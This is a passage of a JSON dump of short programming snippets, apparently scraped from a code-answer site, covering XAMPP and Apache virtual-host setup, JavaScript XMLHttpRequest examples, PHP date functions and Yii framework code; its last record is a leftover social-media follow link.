    "id": 5311,
    "keyword": null,
    "link": null,
    "title": " xampp to test on mobile",
    "description": "// XAMPP ANDROID TESTING FROM SAME NETWORK / ROUTER IP ADDRESS php -S 0.0.0.0:8080 -t FOLDER_NAME_WHO_HAVE_INDEX_FILE_IN_IT\n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5312,
    "keyword": null,
    "link": null,
    "title": " xampp virtual host Access forbidden!",
    "description": "Check your error logs you find out the error is    \"Options FollowSymLinks and SymLinksIfOwnerMatch are both off,    so the RewriteRule directive is also forbidden due to its similar ability    to circumvent directory restrictions\"     This error seems to be solved by adding    <directory \"C:/xampp/htdocs/ocosystem/trunk/ocosystem/public\">      Allow from all </directory>  Full way like this :  <VirtualHost *:80>     ServerName ocosystem     DocumentRoot \"C:/xampp/htdocs/ocosystem/trunk/ocosystem/public\"     ErrorLog \"C:/xampp/htdocs/ocosystem/trunk/ocosystem/storage/logs/ocosystem-error.log\"     CustomLog \"C:/xampp/htdocs/ocosystem/trunk/ocosystem/storage/logs/ocosystem-access.log\" combined     <Directory \"C:/xampp/htdocs/ocosystem/trunk/ocosystem/public\">         #AllowOverride All      # Deprecated         #Options Multiviews     # Deprecated         #Allow from all         # Deprecated                  # --New way of doing it         Require all granted     </Directory>  </VirtualHost> \n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5313,
    "keyword": null,
    "link": null,
    "title": " xdebug won't step over in phpstorm",
    "description": "Try disabling the \"Resolve breakpoint..\" and \"Force break...\" settings in    Settings => PHP => Debug => Xdebug\n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5314,
    "keyword": null,
    "link": null,
    "title": " xhr request javascript",
    "description": "var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() {     if (this.readyState == 4 && this.status == 200) {        // Typical action to be performed when the document is ready:        document.getElementById(\"demo\").innerHTML = xhttp.responseText;     } }; xhttp.open(\"GET\", \"filename\", true); xhttp.send();\nwindow.onload = function(){     var request = new XMLHttpRequest();     var params = \"UID=CORS&name=CORS\";      request.onreadystatechange = function() {         if (this.readyState == 4 && this.status == 200) {             console.log(this.responseText);         }     };      request.open('POST', 'https://www.example.com/api/createUser', true);     request.setRequestHeader('api-key', 'your-api-key');     request.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");     request.send(params); } \nfunction reqListener () {   console.log(this.responseText); }  var oReq = new XMLHttpRequest(); oReq.onload = reqListener; oReq.open(\"GET\", \"http://www.example.org/example.txt\"); oReq.send();\nvar url = \"https://example.com/\";  var xhr = new XMLHttpRequest(); xhr.open(\"GET\", url);  xhr.onreadystatechange = function () {    if (xhr.readyState === 4) {       console.log(xhr.status);       console.log(xhr.responseText);    }};  xhr.send();\nfunction httpGetAsync(url, callback) {   var xmlHttp = new XMLHttpRequest();   xmlHttp.onreadystatechange = function() {      if (xmlHttp.readyState == 4 && xmlHttp.status == 200)       callback(xmlHttp.responseText);   }   xmlHttp.open(\"GET\", url, true); // true for asynchronous    xmlHttp.send(null); }\n<!DOCTYPE html> <html> <body> <p id=\"demo\">result</p> <button type=\"button\" onclick=\"get_post_ajax();\">Change Content</button> <script type=\"text/javascript\"> \tfunction update_progress(e) \t{ \t  if (e.lengthComputable) \t  { \t    var percentage = Math.round((e.loaded/e.total)*100); \t    console.log(\"percent \" + percentage + '%' ); \t  } \t  else  \t  { \t  \tconsole.log(\"Unable to compute progress information since the total size is unknown\"); \t  } \t} \tfunction transfer_complete(e){console.log(\"The transfer is complete.\");} \tfunction transfer_failed(e){console.log(\"An error occurred while transferring the file.\");} \tfunction transfer_canceled(e){console.log(\"The transfer has been canceled by the user.\");} \tfunction get_post_ajax() \t{ \t  \tvar xhttp; \t  \tif (window.XMLHttpRequest){xhttp = new XMLHttpRequest();}//code for modern browsers}  \t \telse{xhttp = new ActiveXObject(\"Microsoft.XMLHTTP\");}// code for IE6, IE5\t  \t \t  \txhttp.onprogress = update_progress; \t\txhttp.addEventListener(\"load\", transfer_complete, false); \t\txhttp.addEventListener(\"error\", transfer_failed, false); \t\txhttp.addEventListener(\"abort\", transfer_canceled, false);\t  \t \t  \txhttp.onreadystatechange = function() \t  \t{ \t    \tif (xhttp.readyState == 4 && xhttp.status == 200) \t    \t{ \t      \t\tdocument.getElementById(\"demo\").innerHTML = xhttp.responseText; \t    \t} \t  \t}; \t  xhttp.open(\"GET\", \"http://it-tu.com/ajax_test.php\", true); \t  xhttp.send(); \t} </script> </body> </html>\n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5315,
    "keyword": null,
    "link": null,
    "title": " xml to object php",
    "description": "$object = json_decode(json_encode(simplexml_load_string($xml)));\n<?php $array = array('hello' => 'world', 'good' => 'morning');  $xml = simplexml_load_string(\"<?xml version='1.0' encoding='utf-8'?><foo />\"); foreach ($array as $k=>$v) {   $xml->addChild($k, $v); } ?> \n",
    "reg_date": "2021-10-12T10:21:22.000Z"
  },
  {
    "id": 5316,
    "keyword": null,
    "link": null,
    "title": " year in php",
    "description": "$currentYear=date(\"Y\");//2019\n$year = date(\"y\",strtotime($mydate));\ndate('Y')\n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5317,
    "keyword": null,
    "link": null,
    "title": " yesterday php",
    "description": "date('F j, Y',strtotime(\"-1 days\"));\n$yesterday = new DateTime('yesterday'); echo $yesterday->format('Y-m-d');\ndate(\"F j, Y\", time() - 86400);\n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5318,
    "keyword": null,
    "link": null,
    "title": " yii1 set flash",
    "description": "<?php if(Yii::app()->user->hasFlash('contact')): ?>  <div class=\"flash-success\"> \t<?php echo Yii::app()->user->getFlash('contact'); ?> </div>  <?php endif; ?>  \nYii::app()->user->setFlash('contact','Thank you for contacting us. We will respond to you as soon as possible.'); \n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5319,
    "keyword": null,
    "link": null,
    "title": " yii2 get cookie",
    "description": "// get the cookie collection (yii\\web\\CookieCollection) from the \"request\" component $cookies = Yii::$app->request->cookies;  // get the \"language\" cookie value. If the cookie does not exist, return \"en\" as the default value. $language = $cookies->getValue('language', 'en');  // an alternative way of getting the \"language\" cookie value if (($cookie = $cookies->get('language')) !== null) {     $language = $cookie->value; }  // you may also use $cookies like an array if (isset($cookies['language'])) {     $language = $cookies['language']->value; }  // check if there is a \"language\" cookie if ($cookies->has('language')) ... if (isset($cookies['language'])) ... \n// get the cookie collection (yii\\web\\CookieCollection) from the \"response\" component $cookies = Yii::$app->response->cookies;  // add a new cookie to the response to be sent $cookies->add(new \\yii\\web\\Cookie([     'name' => 'language',     'value' => 'zh-CN', ]));  // remove a cookie $cookies->remove('language'); // equivalent to the following unset($cookies['language']); \n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5320,
    "keyword": null,
    "link": null,
    "title": " yii2 get params from url",
    "description": "$value = Yii::$app->params['nameParameter'];\nYii::$app->request->queryParams['DataSearch'][\"TANGGAL\"]\n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5321,
    "keyword": null,
    "link": null,
    "title": " yii2 migration add column",
    "description": "yii migrate/create add_position_column_to_post_table --fields=\"position:integer\" \nclass m150811_220037_add_position_column_to_post_table extends Migration {     public function up()     {         $this->addColumn('post', 'position', $this->integer());     }      public function down()     {         $this->dropColumn('post', 'position');     } } \n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5322,
    "keyword": null,
    "link": null,
    "title": " yii 1 clear cache",
    "description": "Yii::app()->cache->flush();\n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5323,
    "keyword": null,
    "link": null,
    "title": " yii app db createcommand join yii1",
    "description": "$user = Yii::app()->db->createCommand()     ->select('id, username, profile')     ->from('tbl_user u')     ->join('tbl_profile p', 'u.id=p.user_id')     ->where('id=:id', array(':id'=>$id))     ->queryRow();\n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5324,
    "keyword": null,
    "link": null,
    "title": " your composer dependencies require a php version \">= 7.3.0\"",
    "description": "Project or global composer.json file  {  \"config\": {      \"platform-check\": false }  }\n",
    "reg_date": "2021-10-12T10:21:23.000Z"
  },
  {
    "id": 5325,
    "keyword": null,
    "link": null,
    "title": " yum install php-mysql",
    "description": "#install php & php-mysql extension sudo yum install php php-mysql #restart web server sudo systemctl restart httpd.service \n",
    "reg_date": "2021-10-12T10:21:24.000Z"
  },
  {
    "id": 5326,
    "keyword": null,
    "link": null,
    "title": " yyyymmdd to yyyy-mm-dd php",
    "description": "$var = '20/04/2012'; $date = str_replace('/', '-', $var); echo date('Y-m-d', strtotime($date)); \n<?php // both lines output 813470400 echo strtotime(\"19951012\"), \"\\n\",      strtotime(\"12 October 1995\");  // prints 1995 Oct 12 echo date(\"Y-m-d\", strtotime(\"19951012\")); ?>\n",
    "reg_date": "2021-10-12T10:21:24.000Z"
  },
  {
    "id": 5327,
    "keyword": null,
    "link": null,
    "title": " zend redirect to url",
    "description": "if (!isset($adminLogin->loggedin)) {     $baseUrl = new Zend_View_Helper_BaseUrl();     $this->getResponse()->setRedirect($baseUrl->baseUrl().'/something'); } \n",
    "reg_date": "2021-10-12T10:21:24.000Z"
  },
  {
    "id": 5328,
    "keyword": null,
    "link": null,
    "title": " zsh: command not found: laravel",
    "description": "export PATH=\"$HOME/.composer/vendor/bin:$PATH\"\nexport PATH=\"$HOME/.config/composer/vendor/bin:$PATH\"\nexport NVM_DIR=~/.nvm  [ -s \"$NVM_DIR/nvm.sh\" ] && . \"$NVM_DIR/nvm.sh\"\nnano .bashrc \n",
    "reg_date": "2021-10-12T10:21:24.000Z"
  },
  {
    "id": 5329,
    "keyword": null,
    "link": null,
    "title": "https:    twitter.com  intent  follow?original referer=https://www.codegrepper.com/&ref src=twsrc^tfw&region=follow link&screen name=codegrepper&tw p=followbutton",
    "description": "",
    "reg_date": "2021-10-12T10:21:24.000Z"
  }
]